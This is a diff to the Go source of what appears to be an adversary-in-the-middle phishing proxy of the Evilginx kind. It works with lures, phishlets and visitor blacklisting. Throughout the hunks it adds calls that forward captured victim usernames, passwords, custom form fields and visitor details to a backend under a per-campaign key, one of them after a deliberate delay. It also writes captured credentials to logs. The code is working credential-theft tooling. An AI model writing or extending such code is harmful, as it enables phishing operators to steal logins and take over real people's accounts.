@@ -77,6 +77,7 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	sniListener       net.Listener
+	key               string
 	isRunning         bool
 	isAdded           bool
 	isAdded2          bool
@@ -331,6 +332,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//#######################################################################
 				// new request MASUK SINI
 				// handle session
+
 				if p.handleSession(req.Host) && pl != nil {
 					log.Important("Request Baru !")
 					sc, err := req.Cookie(p.cookieName)
@@ -343,7 +345,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							var uv url.Values
 							//fmt.Printf("\n UV:\t %s \n", vv)
 
-							l, err, key := p.cfg.GetLureByPath(pl_name, req.URL.String())
+							l, err, key := p.cfg.GetLureByPath(pl_name, req.URL.String()) //  1. _ is key
+							p.cfg.key = key
 							//log.Warning("PL NAME : %s", pl_name)
 							if err == nil {
 								log.Debug("triggered lure for path '%s'", req_path)
@@ -365,6 +368,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if err == nil {
 											if !re.MatchString(req.UserAgent()) {
 												log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+												p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)
 
 												if p.cfg.GetBlacklistMode() == "unauth" {
 													err := p.bl.AddIP(from_ip)
@@ -387,11 +391,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Warning("key user")
+									log.Warning(key)
 
+									p.db.SendValidVisitor(req, remote_addr, key)
+
+									//p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetKey()); err != nil {
+									//log.Error("database: %v", err)
 									//os.Exit(0)
 
 									//key := req.URL.Query().Get("cfg")
-									//
+									// START VALIDATE
 									if len(key) == 0 {
 										log.Warning("No key Initiated")
 										return p.blockRequest(req)
@@ -486,6 +496,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									}
 
+									//END VALIDATE
+
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
@@ -523,6 +535,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 							} else {
 								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+								p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)
 
 								if p.cfg.GetBlacklistMode() == "unauth" {
 									err := p.bl.AddIP(from_ip)
@@ -563,8 +576,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				// redirect for unauthorized requests
+				//var eks = ""
+				_, _, key := p.cfg.GetLureByPath(pl_name, req.URL.String())
+
+				//os.Exit(0)
 				if ps.SessionId == "" && p.handleSession(req.Host) {
 					if !req_ok {
+						p.db.SendInvalidVisitor(0, pl_name, req, remote_addr, key)
 						return p.blockRequest(req)
 					}
 				}
@@ -754,6 +772,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
+									log.Success(p.cfg.key)
+									p.db.SendUsername(um[1], ps.SessionId, p.cfg.key, req, remote_addr)
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -765,6 +785,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if pm != nil && len(pm) > 1 {
 									p.setSessionPassword(ps.SessionId, pm[1])
 									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+									p.db.SendPassword(pm[1], ps.SessionId, key)
 									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 										log.Error("database: %v", err)
 									}
@@ -777,6 +798,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									if cm != nil && len(cm) > 1 {
 										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+										p.db.SendJsonUsernamePassword(cm[1], ps.SessionId, p.cfg.key, remote_addr, req)
 										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 											log.Error("database: %v", err)
 										}
@@ -802,6 +824,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
+											log.Success(p.cfg.key)
+											p.db.SendUsername(um[1], ps.SessionId, p.cfg.key, req, remote_addr)
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
 											}
@@ -812,9 +836,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										if pm != nil && len(pm) > 1 {
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
+
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
 											}
+											time.Sleep(4 * time.Second)
+											p.db.SendPassword(pm[1], ps.SessionId, key)
 										}
 									}
 									for _, cp := range pl.custom {
@@ -823,6 +850,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											if cm != nil && len(cm) > 1 {
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
+												p.db.SendJsonUsernamePassword(cm[1], ps.SessionId, p.cfg.key, remote_addr, req)
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
